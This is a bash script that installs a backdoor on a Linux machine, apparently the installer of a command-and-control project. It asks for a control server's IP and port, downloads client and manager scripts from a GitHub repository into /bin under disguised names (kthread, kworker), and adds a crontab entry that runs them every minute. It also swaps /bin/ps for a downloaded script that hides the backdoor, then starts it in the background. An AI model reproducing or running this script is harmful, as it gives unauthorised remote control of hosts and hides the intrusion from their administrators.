#!/bin/bash
# get options from user
read -p "Enter server IP: " server_ip
read -p "Enter server port: " server_port
echo "Installing backdoor..."

# install dependencies
yum install -y -q python3

# download backdoor scripts
curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /bin/kthread
curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /bin/kworker

# create config file
rm -f /bin/cconf
echo "SERVER_IP = $server_ip" >> /bin/cconf
echo "SERVER_PORT = $server_port" >> /bin/cconf

# make scripts executable and add backdoor to crontab 
chmod +x /bin/kworker
chmod +x /bin/kthread
(crontab -l 2>/dev/null; echo "* * * * * /bin/kworker") | crontab -

# overwrite ps with a script that hides the backdoor
# https://stackoverflow.com/questions/28836042/how-to-hide-a-shell-script-running-in-the-background-from-ps-ef
if [ ! -e "/bin/pso" ]; then
  mv /bin/ps /bin/pso
fi
curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/evil_ps.sh > /bin/ps
chmod +x /bin/ps

# start backdoor
echo "Installation complete. Starting backdoor"
nohup /bin/kworker > /dev/null 2>&1 &
